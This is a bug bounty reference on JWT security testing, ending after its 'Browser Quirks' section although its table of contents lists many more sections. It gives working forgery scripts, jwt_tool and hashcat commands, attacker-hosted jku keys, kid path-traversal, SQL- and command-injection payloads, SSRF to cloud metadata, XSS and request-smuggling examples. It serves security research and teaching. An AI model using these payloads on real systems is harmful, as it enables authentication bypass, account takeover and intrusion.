# JWT Security - Complete Bug Hunting Knowledgebase

> **Research-grade reference for advanced bug bounty hunting and black-box JWT security testing.**
> Compiled from PortSwigger Web Security Academy, HackTricks, PayloadsAllTheThings, ProjectDiscovery Nuclei, and real-world bug bounty research.

---

## Table of Contents

- [Basics](#basics)
- [JWT Theory](#jwt-theory)
- [JWT Structure](#jwt-structure)
- [Signature Verification Internals](#signature-verification-internals)
- [Algorithm Confusion Attacks](#algorithm-confusion-attacks)
- [None Algorithm Bypasses](#none-algorithm-bypasses)
- [Weak Secret Bruteforce](#weak-secret-bruteforce)
- [JWK Injection Attacks](#jwk-injection-attacks)
- [JKU Header Injection](#jku-header-injection)
- [kid Header Path Traversal](#kid-header-path-traversal)
- [Signature Confusion Payloads](#signature-confusion-payloads)
- [Access Token Forgery](#access-token-forgery)
- [Refresh Token Abuse](#refresh-token-abuse)
- [OAuth + JWT Chains](#oauth--jwt-chains)
- [Cache Poisoning + JWT Chains](#cache-poisoning--jwt-chains)
- [Request Smuggling + JWT Chains](#request-smuggling--jwt-chains)
- [SSRF + JWT Chains](#ssrf--jwt-chains)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What are JWTs?

JSON Web Tokens (JWTs) are a standardized format (RFC 7519) for sending cryptographically signed JSON data between systems. They are most commonly used for authentication, session management, and access control mechanisms.

Unlike classic session tokens, all data needed by the server is stored client-side within the JWT itself, making them popular for distributed systems where users interact with multiple back-end servers.

### JWT vs JWS vs JWE

- **JWT**: The base specification defining a format for representing claims as a JSON object.
- **JWS** (JSON Web Signature): Extends JWT with digital signature capabilities. Most "JWTs" in practice are JWS tokens.
- **JWE** (JSON Web Encryption): Extends JWT with encryption capabilities. The actual contents are encrypted rather than just encoded.

> **Note**: Throughout this document, "JWT" primarily refers to JWS tokens, though some vulnerabilities may also apply to JWE tokens.

### Impact of JWT Attacks

JWT attacks typically enable:
- Authentication bypass
- Privilege escalation
- Account takeover
- Full account impersonation
- Access control bypass

The impact is usually **severe** because JWTs are commonly used at the core of authentication and authorization systems.

---

## JWT Theory

### How JWTs Work

1. **Issuance**: Server creates a JWT containing user claims and signs it with a secret key (symmetric) or private key (asymmetric).
2. **Transmission**: JWT is sent to the client (typically in a cookie, Authorization header, or localStorage).
3. **Verification**: On subsequent requests, the server verifies the signature to ensure the token hasn't been tampered with.
4. **Trust**: If the signature is valid, the server trusts the claims within the payload.

### The Fundamental Problem

Servers don't store information about issued JWTs. Each token is entirely self-contained. Therefore, if the server doesn't verify the signature properly, there's nothing to stop an attacker from making arbitrary changes to the token's contents.

### Common JWT Libraries

| Language | Library | Common Vulnerability |
|----------|---------|----------------------|
| Node.js | `jsonwebtoken` | `verify()` vs `decode()` confusion |
| Python | `PyJWT` | Algorithm confusion, weak secret handling |
| Java | `jjwt`, `nimbus-jose-jwt` | JWK/JKU injection support |
| PHP | `firebase/php-jwt` | Algorithm switching |
| Ruby | `jwt` gem | Algorithm confusion |
| Go | `golang-jwt/jwt` | Default algorithm acceptance |

---

## JWT Structure

### Format

```
Base64Url(Header).Base64Url(Payload).Base64Url(Signature)
```

### Header

```json
{
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key-id-123"
}
```

**Registered Header Parameters:**

| Parameter | Definition | Attack Relevance |
|-----------|-----------|------------------|
| `alg` | Algorithm | **Critical** - Controls verification method |
| `jku` | JWK Set URL | **Critical** - SSRF, key injection |
| `jwk` | JSON Web Key | **Critical** - Self-signed key injection |
| `kid` | Key ID | **Critical** - Path traversal, SQLi |
| `x5u` | X.509 URL | High - Certificate injection |
| `x5c` | X.509 Certificate Chain | High - Self-signed cert injection |
| `x5t` | X.509 SHA-1 Thumbprint | Medium - Fingerprint confusion |
| `x5t#S256` | X.509 SHA-256 Thumbprint | Medium |
| `typ` | Type | Low |
| `cty` | Content Type | **High** - XXE, deserialization pivot |
| `crit` | Critical Extensions | Medium |

### Payload (Claims)

```json
{
    "iss": "issuer",
    "sub": "subject/user",
    "aud": "audience",
    "exp": 1648037164,
    "nbf": 1516239022,
    "iat": 1516239022,
    "jti": "unique-id",
    "role": "user",
    "isAdmin": false
}
```

**Standard Claims:**

| Claim | Purpose | Attack Relevance |
|-------|---------|------------------|
| `iss` | Issuer | Spoofing, trust boundary |
| `sub` | Subject | **Critical** - User impersonation |
| `aud` | Audience | **High** - Cross-service token reuse |
| `exp` | Expiration | **High** - Token replay, lifetime extension |
| `nbf` | Not Before | Medium - Time-based attacks |
| `iat` | Issued At | Medium - Token age validation |
| `jti` | JWT ID | Low - Replay prevention bypass |

---

## Signature Verification Internals

### How Signatures Are Verified

**HMAC (HS256/HS384/HS512):**
```
Signature = HMAC-SHA256(Base64Url(Header) + "." + Base64Url(Payload), Secret)
```

**RSA (RS256/RS384/RS512):**
```
Signature = RSA-SHA256(Base64Url(Header) + "." + Base64Url(Payload), PrivateKey)
Verification = RSA-SHA256-verify(Signature, PublicKey)
```

**ECDSA (ES256/ES384/ES512):**
```
Signature = ECDSA-SHA256(Base64Url(Header) + "." + Base64Url(Payload), PrivateKey)
```

### Common Verification Flaws

1. **Accepting arbitrary signatures**: Using `decode()` instead of `verify()`
2. **Accepting tokens with no signature**: Not rejecting `alg: none`
3. **Algorithm confusion**: Using wrong algorithm for verification
4. **Key confusion**: Using public key as HMAC secret
5. **Missing signature verification**: Custom implementations skipping checks

### The `verify()` vs `decode()` Trap

```javascript
// VULNERABLE - Only decodes, doesn't verify
const decoded = jwt.decode(token);

// SECURE - Verifies signature
const verified = jwt.verify(token, secret);
```

> **Research Note**: The Node.js `jsonwebtoken` library has both methods. Developers frequently confuse them, leading to complete signature bypass vulnerabilities.

---

## Algorithm Confusion Attacks

### Theory

Algorithm confusion (also known as key confusion) occurs when an attacker forces the server to verify a JWT signature using a different algorithm than intended by the developers.

**The Core Problem:**
Many JWT libraries provide a single, algorithm-agnostic `verify()` method that relies on the `alg` parameter in the token's header to determine verification behavior.

```python
# Pseudo-code showing the vulnerability
function verify(token, secretOrPublicKey):
    algorithm = token.getAlgHeader()
    if algorithm == "RS256":
        # Use provided key as RSA public key
    elif algorithm == "HS256":
        # Use provided key as HMAC secret key
```

**Attack Scenario:**
1. Server uses RS256 (asymmetric) with a public/private key pair
2. Server exposes its public key (e.g., via `/jwks.json`)
3. Attacker obtains the public key
4. Attacker creates a token with `alg: HS256` and signs it using the public key as the HMAC secret
5. Server's `verify()` method sees `alg: HS256`, treats the public key as HMAC secret, and validates the signature

### Attack Steps

**Step 1: Obtain the server's public key**
```bash
# From JWKS endpoint
curl https://target.com/.well-known/jwks.json

# From TLS certificate
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout

# From two existing JWTs (derive n)
docker run --rm -it portswigger/sig2n <token1> <token2>
```

**Step 2: Convert public key to suitable format**

Using JWT Editor extension in Burp:
1. Go to JWT Editor Keys tab
2. Click New RSA Key
3. Paste the JWK
4. Select PEM radio button, copy the PEM
5. Go to Decoder tab, Base64-encode the PEM
6. Generate New Symmetric Key in JWK format
7. Replace `k` parameter with Base64-encoded PEM

**Step 3: Modify the JWT**
- Change `alg` to `HS256`
- Modify payload claims (e.g., `sub` to `administrator`)

**Step 4: Sign with the public key as HMAC secret**

### Manual Exploitation

```bash
# Convert public key to hex
cat public.pem | xxd -p | tr -d "\n"

# Generate HMAC signature using public key as hex secret
echo -n "[HEADER].[PAYLOAD]" | openssl dgst -sha256 -mac HMAC -macopt hexkey:[HEX_KEY]

# Convert signature to base64url
python3 -c "import base64, binascii; print(base64.urlsafe_b64encode(binascii.a2b_hex('SIGNATURE_HEX')).replace(b'=', b'').decode())"
```

### Automated Exploitation

```bash
# Using jwt_tool
python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
```

### CVE-2016-5431: RS256 to HS256 Key Confusion

```python
# Vulnerable PyJWT <= 0.4.3
import jwt
public = open('public.pem', 'r').read()
token = jwt.encode({"data": "test"}, key=public, algorithm='HS256')
print(token)
```

> **Note**: Modern PyJWT versions (>= 2.0) prevent this by raising `InvalidKeyError` when an asymmetric key is used with HMAC algorithms. However, many legacy systems still run old versions.

### Python Exploit Script

```python
import jwt
import base64
from cryptography.hazmat.primitives import serialization

# Load public key
with open('public.pem', 'rb') as f:
    public_key = f.read()

# Create malicious payload
payload = {
    "sub": "administrator",
    "role": "admin",
    "iat": 1516239022
}

# Sign with HS256 using public key as secret
# Note: This only works with vulnerable libraries
try:
    malicious_token = jwt.encode(payload, key=public_key, algorithm='HS256')
    print(f"[+] Forged token: {malicious_token}")
except Exception as e:
    print(f"[-] Error: {e}")
    print("[*] Try with older PyJWT: pip install pyjwt==0.4.3")
```

### Deriving Public Keys from Existing Tokens

When the public key isn't readily available, derive it from two signed JWTs:

```bash
# Using sig2n (PortSwigger)
docker run --rm -it portswigger/sig2n <token1> <token2>

# Using jws2pubkey
# https://github.com/SecuraBV/jws2pubkey
docker run -it ttervoort/jws2pubkey JWS1 JWS2
```

**How it works:**
RS256/RS384/RS512 use RSA with PKCS#1 v1.5 padding. Given two different messages and their signatures, you can compute the public key's `n` value.

---

## None Algorithm Bypasses

### Theory

JWT supports a `none` algorithm for unsigned tokens (unsecured JWTs). This was originally introduced for debugging but creates severe security risks.

**The Vulnerability:**
Servers should reject tokens with `alg: none`, but string-based filtering can be bypassed using case variations and encoding tricks.

### None Algorithm Variants

```json
{"alg": "none"}
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
{"alg": "NONE"}
{"alg": "nOne"}
```

### CVE-2015-9235: None Algorithm

**Exploit with jwt_tool:**
```bash
python3 jwt_tool.py JWT_HERE -X a
```

**Manual Exploit:**
```python
import jwt

# Original token
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'

# Decode without verification
decoded = jwt.decode(token, verify=False)

# Re-encode with none algorithm (requires older PyJWT)
none_token = jwt.encode(decoded, key='', algorithm=None)
print(none_token)
```

**Important:** Even with `alg: none`, the payload must still be terminated with a trailing dot:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

### Bypassing None Algorithm Filters

```python
# Common filter bypass techniques
# Case variation
{"alg": "NONE"}

# Mixed case
{"alg": "nOnE"}

# Unicode normalization
{"alg": "\u006e\u006f\u006e\u0065"}  # "none" in unicode

# Array trick (some parsers accept first valid alg)
{"alg": ["none", "HS256"]}

# Null/empty variations
{"alg": null}
{"alg": ""}
```

### CVE-2020-28042: Null Signature Attack

Send a JWT with HS256 algorithm but without a signature:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

**Exploit:**
```bash
python3 jwt_tool.py JWT_HERE -X n
```

---

## Weak Secret Bruteforce

### Theory

HMAC-based algorithms (HS256/HS384/HS512) use an arbitrary string as the secret key. If this secret is weak, predictable, or default, attackers can brute-force it and forge valid signatures for any token.

### Common Weak Secrets

```
secret
password
123456
your-256-bit-secret
change_this_super_secret_random_string
jwt_secret
mysecret
token_secret
supersecret
admin
key
secretkey
test
dev
production
```

### Wordlist Resources

- [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) - 3502 public JWT secrets
- [SecLists Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
- [PayloadsAllTheThings JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

### Bruteforce with Hashcat

```bash
# Dictionary attack
hashcat -a 0 -m 16500 <jwt> <wordlist>

# Rule-based attack
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule

# Brute force (character-by-character)
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6

# Show previously cracked
hashcat -a 0 -m 16500 <jwt> <wordlist> --show
```

**Hashcat Output Format:**
```
<jwt>:<identified-secret>
```

### Bruteforce with jwt_tool

```bash
# Dictionary attack
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -d /tmp/wordlist -C

# Character-by-character brute force (extremely weak secrets)
python3 jwt_tool.py JWT_HERE -C -d /tmp/wordlist
```

### Post-Bruteforce Exploitation

Once the secret is known:

```bash
# Sign new token with known secret
python3 jwt_tool.py JWT_HERE -T
# Then select option [1] Sign token with known key

# Or directly forge
python3 jwt_tool.py -I -pc role -pv admin -S hs256 -p "secret1"
```

### CVE-2019-20933 / CVE-2020-28637: Blank Password

Some implementations accept empty string or null as valid secrets:

```bash
# Test with empty secret
python3 jwt_tool.py JWT_HERE -S hs256 -p ""

# Test with null byte
python3 jwt_tool.py JWT_HERE -S hs256 -p "\x00"
```

---

## JWK Injection Attacks

### Theory

The `jwk` (JSON Web Key) header parameter allows embedding a public key directly within the JWT header. Misconfigured servers may use any key embedded in the `jwk` parameter for verification, allowing attackers to sign tokens with their own private keys.

### CVE-2018-0114: Key Injection

**Vulnerability:** Cisco node-jose library before 0.11.0 allowed attackers to embed their own public key in the JWK header and re-sign tokens.

**Exploit with jwt_tool:**
```bash
python3 jwt_tool.py JWT_HERE -X i
```

**Manual Exploit:**

1. Generate a new RSA key pair
2. Embed the public key in the JWT header as JWK
3. Sign the token with your private key
4. Server uses embedded JWK to verify, accepting your forged token

**Malicious JWK Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}
```

**Burp JWT Editor Attack:**
1. Go to JWT Editor Keys tab
2. Click New RSA Key -> Generate
3. In Repeater, switch to JSON Web Token tab
4. Modify payload (e.g., change `sub` to `administrator`)
5. Click Attack -> Embedded JWK
6. Select your generated RSA key
7. Send request

**Python Exploit:**
```python
from jwcrypto import jwk, jwt

# Generate attacker key pair
key = jwk.JWK.generate(kty='RSA', size=2048)

# Create token with embedded JWK
token = jwt.JWT(
    header={
        "alg": "RS256",
        "typ": "JWT",
        "jwk": key.export_public(as_dict=True)
    },
    claims={"sub": "administrator", "role": "admin"}
)

# Sign with attacker's private key
token.make_signed_token(key)
print(token.serialize())
```

---

## JKU Header Injection

### Theory

The `jku` (JWK Set URL) header parameter references a URL containing a set of public keys (JWKS). When verifying the signature, the server fetches the key from this URL. By controlling the `jku` URL, attackers can force the server to use their malicious public key.

### Common JWKS Endpoints

```
/.well-known/jwks.json
/jwks.json
/openid/connect/jwks.json
/api/keys
/api/v1/keys
/{tenant}/oauth2/v1/certs
/.well-known/openid-configuration/jwks
```

### Attack Steps

1. Generate a new RSA key pair
2. Host your public key as a JWKS file on a server you control
3. Create a JWT with `jku` pointing to your malicious JWKS
4. Set `kid` to match your key's ID
5. Sign with your private key
6. Server fetches your JWKS and verifies with your public key

**Malicious JWKS:**
```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
        }
    ]
}
```

**Exploit with jwt_tool:**
```bash
# Auto-exploit (uses config jwkloc)
python3 jwt_tool.py JWT_HERE -X s

# With custom JKU URL
python3 jwt_tool.py JWT_HERE -X s -ju http://attacker.com/jwks.json
```

**Burp JWT Editor Attack:**
1. Generate RSA key, host JWKS on exploit server
2. Edit JWT header: replace `kid` with your key's ID
3. Add `jku` parameter pointing to your JWKS URL
4. Modify payload claims
5. Sign with your RSA key (Don't modify header option)

**Python Exploit:**
```python
import requests
from jwcrypto import jwk, jwt

# Generate key and host JWKS
key = jwk.JWK.generate(kty='RSA', size=2048)
jwks = {"keys": [key.export_public(as_dict=True)]}

# Host this at https://attacker.com/jwks.json
# (Use exploit server or your own domain)

# Create malicious token
token = jwt.JWT(
    header={
        "alg": "RS256",
        "typ": "JWT",
        "kid": key.thumbprint(),
        "jku": "https://attacker.com/jwks.json"
    },
    claims={"sub": "administrator", "role": "admin"}
)
token.make_signed_token(key)
print(token.serialize())
```

### URL Parsing Bypasses

More secure servers whitelist `jku` domains. Bypass techniques:

```
# Using @ trick (if parser is vulnerable)
jku: https://trusted.com@attacker.com/jwks.json

# Using path traversal in URL
jku: https://trusted.com/../attacker.com/jwks.json

# Using URL encoding
jku: https://trusted.com%2f..%2fattacker.com/jwks.json

# Using null byte (legacy parsers)
jku: https://trusted.com%00attacker.com/jwks.json

# Using DNS rebinding
jku: https://trusted.com.evil.com/jwks.json
```

---
## kid Header Path Traversal

### Theory

The `kid` (Key ID) parameter identifies which key to use for verification. If the server uses the `kid` to locate keys via filesystem paths or database queries, it may be vulnerable to path traversal or SQL injection.

### Path Traversal Attack

**Target:** Servers that load verification keys from files using `kid` as filename.

**Attack:** Point `kid` to a file with predictable contents.

```json
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256",
    "typ": "JWT"
}
```

**Why `/dev/null` works:**
- `/dev/null` returns empty string when read
- Sign token with empty string as secret
- Server reads `/dev/null` (empty), uses empty string to verify
- Signature matches

**Other Predictable Files:**
```
/dev/null        -> Empty string
/dev/zero        -> Null bytes
/proc/version    -> Kernel version (predictable on same OS)
/proc/sys/kernel/randomize_va_space  -> "2" (common value)
/etc/hostname    -> Server hostname
/etc/passwd      -> First line often predictable
```

**Exploit with jwt_tool:**
```bash
# Using /dev/null (empty secret)
python3 jwt_tool.py JWT_HERE -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Using /proc/sys/kernel/randomize_va_space (value "2")
python3 jwt_tool.py JWT_HERE -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

**Burp JWT Editor Attack:**
1. Generate New Symmetric Key
2. Replace `k` with Base64-encoded null byte: `AA==`
3. Change `kid` to `../../../../../../../dev/null`
4. Change payload claims
5. Sign with the symmetric key

### SQL Injection via kid

If `kid` is used in a database query:

```json
{
    "kid": "' UNION SELECT 'secret' --",
    "alg": "HS256"
}
```

**Payloads:**
```
' OR '1'='1
' UNION SELECT secret FROM keys --
' AND 1=1 --
"; SELECT * FROM keys; --
```

### Command Injection via kid

If `kid` is passed to system commands:

```json
{
    "kid": "; cat /etc/passwd;",
    "alg": "HS256"
}
```

---

## Signature Confusion Payloads

### Algorithm Switching Payloads

```json
// HS256 -> RS256 confusion
{"alg": "RS256", "typ": "JWT"}

// RS256 -> HS256 confusion  
{"alg": "HS256", "typ": "JWT"}

// ES256 -> HS256 confusion
{"alg": "HS256", "typ": "JWT"}

// PS256 -> HS256 confusion
{"alg": "HS256", "typ": "JWT"}
```

### Multiple Algorithm Headers

```json
// Array of algorithms (some parsers accept first valid)
{"alg": ["none", "HS256"], "typ": "JWT"}

// Nested algorithms
{"alg": {"alg": "none"}, "typ": "JWT"}
```

### Encoding Confusion

```json
// Base64 encoded alg header (double encoding)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

// URL encoding in JSON
{"alg": "%6e%6f%6e%65", "typ": "JWT"}

// Unicode escape sequences
{"alg": "\u006e\u006f\u006e\u0065", "typ": "JWT"}
```

### Signature Stripping Variants

```
# Standard null signature (trailing dot)
[HEADER].[PAYLOAD].

# Multiple dots
[HEADER].[PAYLOAD]..

# Whitespace after dot
[HEADER].[PAYLOAD]. 

# Newline in signature
[HEADER].[PAYLOAD].\n
```

---

## Access Token Forgery

### Theory

Access tokens (often JWTs) grant access to protected resources. If the token's integrity can be compromised, attackers can forge tokens with elevated privileges.

### Common Claims to Forge

```json
{
    "sub": "administrator",
    "role": "admin",
    "isAdmin": true,
    "permissions": ["*"],
    "scope": "read write admin",
    "aud": "api.target.com",
    "iss": "trusted-issuer.com"
}
```

### Token Replay Attacks

```json
{
    "sub": "victim",
    "iat": 1516239022,
    "exp": 9999999999  // Extended expiration
}
```

### Audience Confusion

```json
{
    "aud": "different-service.target.com",  // Token for different service
    "sub": "administrator"
}
```

### Issuer Spoofing

```json
{
    "iss": "attacker-controlled-issuer.com",
    "sub": "administrator"
}
```

---

## Refresh Token Abuse

### Theory

Refresh tokens are long-lived credentials used to obtain new access tokens. If refresh tokens are also JWTs or are improperly bound to access tokens, they can be abused.

### Refresh Token Rotation Bypass

Some implementations don't properly invalidate old refresh tokens after rotation:

```
1. Attacker steals refresh token
2. User refreshes, gets new access + refresh token
3. Old refresh token should be invalidated but isn't
4. Attacker can still use old refresh token
```

### Refresh Token Scope Escalation

```json
// Request new token with expanded scope
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=eyJhbGciOiJIUzI1NiIs...
&scope=read write admin  // Expanded scope
```

### Cross-Client Refresh Token Abuse

```
// If refresh tokens aren't bound to client_id
// Attacker uses victim's refresh token with attacker's client_id
POST /oauth/token

grant_type=refresh_token
&refresh_token=VICTIM_REFRESH_TOKEN
&client_id=ATTACKER_CLIENT_ID
```

---

## OAuth + JWT Chains

### Theory

OAuth 2.0 and OpenID Connect heavily rely on JWTs for id_tokens, access tokens, and client assertions. Vulnerabilities in JWT handling can cascade through the entire OAuth flow.

### Dynamic Client Registration SSRF

**CVE-2021-26715 (MITREid Connect):**

The OAuth Dynamic Client Registration endpoint accepts URL parameters that can trigger SSRF:

```http
POST /connect/register HTTP/1.1
Host: server.example.com
Content-Type: application/json

{
    "application_type": "web",
    "redirect_uris": ["https://attacker.com/callback"],
    "client_name": "My App",
    "logo_uri": "http://attacker.com/xss.html",  // SSRF trigger
    "jwks_uri": "http://attacker.com/jwks.json",  // SSRF trigger
    "sector_identifier_uri": "http://attacker.com/sector.json",
    "request_uris": ["http://attacker.com/request.jwt"]
}
```

**SSRF Trigger Points:**
1. `logo_uri` - Server fetches image during authorization display
2. `jwks_uri` - Server fetches key when validating client_assertion
3. `sector_identifier_uri` - Server fetches redirect URI list
4. `request_uris` - Server fetches request JWT during authorization

### request_uri SSRF

```http
GET /authorize?response_type=code%20id_token
    &client_id=sclient1
    &request_uri=https://attacker.com/malicious.jwt
```

The server fetches the JWT from the attacker-controlled URL, potentially:
- Exposing internal services
- Reading internal metadata endpoints
- Port scanning internal network

### redirect_uri Session Poisoning

**CVE-2021-27582 (MITREid Connect):**

When OAuth servers store authorization parameters in the session:

```
Step 1: User visits /authorize?client_id=TRUSTED&redirect_uri=http://trusted.com
Step 2: In background, attacker sends /authorize?client_id=UNTRUSTED&redirect_uri=http://attacker.com
Step 3: Session gets poisoned with attacker's redirect_uri
Step 4: User approves trusted client, but gets redirected to attacker's URL with code/token
```

### WebFinger User Enumeration

```http
GET /.well-known/webfinger?resource=http://x/admin&rel=http://openid.net/specs/connect/1.0/issuer
```

Response reveals whether user exists:
```json
{
    "subject": "http://x/admin",
    "links": [{
        "rel": "http://openid.net/specs/connect/1.0/issuer",
        "href": "http://127.0.0.1:7077/openam/oauth2"
    }]
}
```

### JWT Client Assertion Confusion

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=AUTH_CODE
&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer
&client_assertion=eyJhbGciOiJSUzI1NiJ9...  // JWT signed with attacker's key
```

If server uses `jwks_uri` from dynamic registration to validate client_assertion, attacker controls the verification key.

---

## Cache Poisoning + JWT Chains

### Theory

Web cache poisoning turns caches into exploit delivery systems. When combined with JWT manipulation, this can deliver forged tokens or poison JWT-dependent responses to all users.

### Cache Key Concepts

Caches identify resources using **cache keys** (typically: Host + Path + Query). **Unkeyed inputs** (headers, cookies not in cache key) can affect the response without affecting the cache key.

### JWT in Unkeyed Headers

If JWTs are passed in unkeyed headers:

```http
GET /api/user HTTP/1.1
Host: target.com
X-Custom-Auth: eyJhbGciOiJIUzI1NiJ9...  // Unkeyed header
```

If the application uses this header for authorization but the cache doesn't include it in the cache key:
1. Attacker sends request with forged admin JWT in `X-Custom-Auth`
2. Cache stores the admin response for `/api/user`
3. Normal users get the cached admin response

### Cache Poisoning via X-Forwarded-Host + JWT

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...  // Admin JWT
```

If the application generates URLs based on `X-Forwarded-Host` and the response is cached:
```html
<meta property="og:image" content="https://attacker.com/image.png" />
```

### DOM Poisoning with JWT

```http
GET /api/i18n/en HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

If the application uses `data-site-root` attribute:
```html
<body data-site-root="https://attacker.com/">
```

JavaScript loads translations from attacker's domain:
```javascript
// Attacker's /api/i18n/en
{"Show more": "<svg onload=alert(1)>"}
```

### Cache Poisoning to XSS via JWT Manipulation

```http
GET /en HTTP/1.1
Host: target.com
X-Forwarded-Host: a."><script>alert(1)</script>
Cookie: session=FORGED_JWT_WITH_ADMIN_CLAIMS
```

If response is cached with XSS payload and admin session data.

---

## Request Smuggling + JWT Chains

### Theory

HTTP Request Smuggling exploits discrepancies between front-end and back-end servers in parsing HTTP request boundaries. When combined with JWT handling, this can:
- Poison connections with forged JWTs
- Bypass JWT validation on front-end
- Inject malicious requests with attacker-controlled JWTs

### CL.TE Desync with JWT

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 41
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Custom-Auth: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
```

Front-end uses Content-Length, back-end uses Transfer-Encoding. The smuggled request bypasses front-end JWT validation.

### CL.0 Browser-Powered Desync

```http
POST /favicon.ico HTTP/1.1
Host: target.com
Content-Length: 23

GET /admin HTTP/1.1
X: Y
```

If server ignores Content-Length on POST to static files, the body becomes a new request.

### Client-Side Desync (CSD) with JWT

```javascript
// Attacker's page makes victim's browser send:
fetch('https://target.com/robots.txt', {
    method: 'POST',
    body: 'GET /admin HTTP/1.1\r\n'
         + 'Authorization: Bearer FORGED_ADMIN_JWT\r\n'
         + 'X: Y',
    credentials: 'include'
}).then(() => {
    location = 'https://target.com/'
})
```

### H2.TE Downgrade with JWT

HTTP/2 to HTTP/1.1 downgrade can strip Content-Length, causing desync:

```
HTTP/2 request:
:method: POST
:path: /
:authority: target.com
content-length: 0

[malicious body with smuggled JWT request]
```

Front-end (HTTP/2) sees length 0, back-end (HTTP/1.1) reads body as new request.

---

## SSRF + JWT Chains

### Theory

JWT-related parameters that accept URLs can be exploited for Server-Side Request Forgery:
- `jku` - JWKS URL
- `x5u` - X.509 certificate URL
- OAuth `logo_uri`, `jwks_uri`, `request_uri`
- `kid` pointing to remote files

### jku SSRF

```json
{
    "alg": "RS256",
    "jku": "http://169.254.169.254/latest/meta-data/",  // AWS metadata
    "kid": "aws"
}
```

### x5u SSRF

```json
{
    "alg": "RS256",
    "x5u": "http://internal.service.local/admin",
    "kid": "internal"
}
```

### kid SSRF (Remote File)

```json
{
    "alg": "HS256",
    "kid": "http://attacker.com/controlled.key",
    "typ": "JWT"
}
```

### OAuth Dynamic Registration SSRF

```http
POST /register HTTP/1.1
Content-Type: application/json

{
    "redirect_uris": ["https://attacker.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "jwks_uri": "http://internal.service.local/api/keys",
    "request_uris": ["http://169.254.169.254/"]
}
```

### Blind SSRF via JWT

When the server doesn't return the fetched content but makes the request:

```json
{
    "alg": "RS256",
    "jku": "http://attacker.com/blind-ssrf-check",
    "kid": "blind"
}
```

Monitor attacker server for incoming requests.

---
## Browser Quirks

### Case Sensitivity in alg

```json
{"alg": "NONE"}     // Some parsers accept
{"alg": "none"}     // Standard
{"alg": "None"}     // Some parsers accept
{"alg": "nOnE"}     // Bypass case filters
```

### Trailing Dot Requirements

Even with `alg: none`, the payload MUST be terminated with a trailing dot:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
                                                              ^
                                                              Required!
```

### Base64url vs Base64

JWT uses Base64url encoding (URL-safe variant):
- `+` -> `-`
- `/` -> `_`
- `=` padding omitted

